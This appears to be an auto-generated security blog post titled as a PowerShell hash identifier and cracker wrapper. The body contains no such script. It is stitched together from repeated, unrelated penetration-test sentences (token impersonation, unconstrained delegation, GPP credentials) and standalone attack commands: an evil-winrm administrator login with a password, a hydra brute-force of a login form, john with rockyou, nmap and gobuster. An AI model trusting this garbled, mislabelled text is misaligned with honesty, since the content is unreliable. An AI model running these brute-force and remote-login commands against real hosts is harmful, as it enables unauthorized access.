---
TitleSEO: "Hash Identifier and Cracker Wrapper in PowerShell | ZureFX"
TitlePost: "Hash Identifier and Cracker Wrapper — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for hash identifier and cracker wrapper. Built for security research and automation."
Keywords: "parser, go, python, powershell"
URL: "https://zurefx.github.io/scripting/script-hash-identifier-and-cracker-wrapper-444.html"
URL_IMAGES: ""
Date: "2024-09-03"
Tags: "Parser, Go, Python, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-hash-identifier-and-cracker-wrapper-444"
Permalink: "/scripting/script-hash-identifier-and-cracker-wrapper-444.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Token impersonation allowed elevation to SYSTEM privileges on the target. Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `wpscan`
- `john`
- `bloodhound`

## Implementation

### Core Logic

Authentication bypass was achieved through careful manipulation of the login mechanism. Weak file permissions allowed modification of critical system files.

```powershell
evil-winrm -i 10.111.174.30 -u administrator -p 'P@ssw0rd!'
```

The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine.

### Helper Functions

The application stored sensitive credentials in an unencrypted configuration file. The service account had excessive permissions assigned in Active Directory.

```powershell
nmap -sCV -p3306,135,1521 10.23.194.70 -oN scan.txt
```

## Usage

### Basic Usage

The target system was identified as running a vulnerable version of the service. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.111.250.130 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Advanced Options

The backup files contained sensitive information that should not have been accessible. Command injection was possible through unsanitized user input in the search functionality. Weak file permissions allowed modification of critical system files.

```bash
gobuster dir -u http://10.85.228.184/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Output

### Example Output

The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials.

```
[+] Scanning target...
[+] Found 16 results
[+] Done in 14.90s
```
